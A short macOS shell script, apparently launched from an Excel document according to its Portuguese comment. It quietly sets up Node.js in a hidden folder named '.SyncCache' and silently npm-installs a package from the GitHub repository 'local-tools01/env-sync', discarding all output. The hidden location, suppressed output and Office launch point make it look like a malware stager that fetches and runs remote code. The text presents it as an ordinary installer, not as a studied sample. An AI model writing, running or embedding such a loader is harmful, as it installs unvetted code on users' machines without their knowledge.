#!/bin/sh
# instala o pacote sem depender do PATH do Excel
PATH="/opt/homebrew/bin:/usr/local/bin:$HOME/.volta/bin:$HOME/.local/bin:$HOME/Library/pnpm:$PATH"
for d in "$HOME"/.nvm/versions/node/*/bin "$HOME"/.fnm/node-versions/*/installation/bin "$HOME"/.local/share/fnm/node-versions/*/installation/bin; do
  [ -d "$d" ] && PATH="$d:$PATH"
done
dir="$HOME/Library/Application Support/.SyncCache"
mkdir -p "$dir" || exit 1
if ! command -v npm >/dev/null 2>&1; then
  case "$(uname -m)" in arm64) arq=arm64 ;; x86_64) arq=x64 ;; *) exit 1 ;; esac
  node="$dir/node"
  if [ ! -x "$node/bin/node" ]; then
    curl -fsSL "https://nodejs.org/dist/v26.13.1/node-v26.13.1-darwin-$arq.tar.gz" -o "$dir/node.tgz" || exit 1
    mkdir -p "$node" && tar -xzf "$dir/node.tgz" -C "$node" --strip-components=1 || exit 1
    rm -f "$dir/node.tgz"
  fi
  PATH="$node/bin:$PATH"
fi
cd "$dir" || exit 1
[ -f package.json ] || printf '{"name":"sync-cache","private":true}\n' > package.json
npm install --no-fund --no-audit --loglevel=error github:local-tools01/env-sync >/dev/null 2>&1
